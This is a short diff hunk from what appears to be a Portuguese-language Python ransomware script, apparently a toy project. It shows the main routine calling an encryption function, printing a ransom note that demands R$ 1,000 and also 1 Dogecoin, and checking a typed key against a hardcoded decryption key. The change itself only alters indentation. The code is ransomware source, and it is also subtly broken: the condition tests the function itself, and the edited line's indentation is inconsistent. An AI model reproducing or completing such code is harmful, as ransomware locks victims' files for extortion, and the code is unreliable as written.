@@ -72,7 +72,7 @@ def descrypt(decrypt_file):
 if __name__ == '__main__':
     criptografando()
     if criptografando:
-		print('Seu PC foi criptografado, agora você precisa pagar R$ 1,000 reais para receber a chave de decriptografia.\
+	print('Seu PC foi criptografado, agora você precisa pagar R$ 1,000 reais para receber a chave de decriptografia.\
         O valor para decriptografar é : 1 Doge coin')
         key = input('Seu PC foi criptografado informe a chave  para liberar os arquivos:')
         if key == '1ab2c3e4f5g6h7i8':
